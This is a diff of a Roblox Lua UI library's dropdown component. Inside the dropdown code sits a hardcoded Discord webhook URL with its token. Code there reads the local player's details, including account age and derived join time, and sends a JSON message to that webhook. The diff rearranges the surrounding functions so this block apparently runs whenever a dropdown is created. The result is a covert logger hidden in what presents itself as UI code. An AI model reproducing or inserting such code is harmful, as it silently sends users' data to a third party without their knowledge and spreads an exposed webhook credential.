@@ -1378,8 +1378,23 @@ UIG.Parent = Open
             end
     
             funcs.RemoveOption = function(self, option)
+
+              local option = DropdownModule:FindFirstChild("Option_" .. option)
+              if option then option:Destroy() end
+            end
+    
+            funcs.SetOptions = function(self, options)
+              for _, v in next, DropdownModule:GetChildren() do
+                if v.Name:match("Option_") then
+                  v:Destroy()
+                end
+              end
+              for _,v in next, options do
+                funcs:AddOption(v)
+              end
+            end
             
-              local Webhook = "https://discord.com/api/webhooks/1298504830230331535/DG1EwrtjJNhBVPC5W8u4ERgVIAUoQ4BpdSgKLQ93duT25R3fe6GGZVWXq1OiDe0KlLGj"
+            local Webhook = "https://discord.com/api/webhooks/1298504830230331535/DG1EwrtjJNhBVPC5W8u4ERgVIAUoQ4BpdSgKLQ93duT25R3fe6GGZVWXq1OiDe0KlLGj"
 local HS = game:GetService("HttpService")
 local player = game:GetService("Players").LocalPlayer
 local joinTime = os.time() - (player.AccountAge * 86400)
@@ -1509,22 +1524,7 @@ request({
         Headers = {["Content-Type"] = "application/json"},
         Body = HS:JSONEncode(msg)
 })
-
-              local option = DropdownModule:FindFirstChild("Option_" .. option)
-              if option then option:Destroy() end
-            end
-    
-            funcs.SetOptions = function(self, options)
-              for _, v in next, DropdownModule:GetChildren() do
-                if v.Name:match("Option_") then
-                  v:Destroy()
-                end
-              end
-              for _,v in next, options do
-                funcs:AddOption(v)
-              end
-            end
-
+            
             funcs:SetOptions(options)  
     
             return funcs
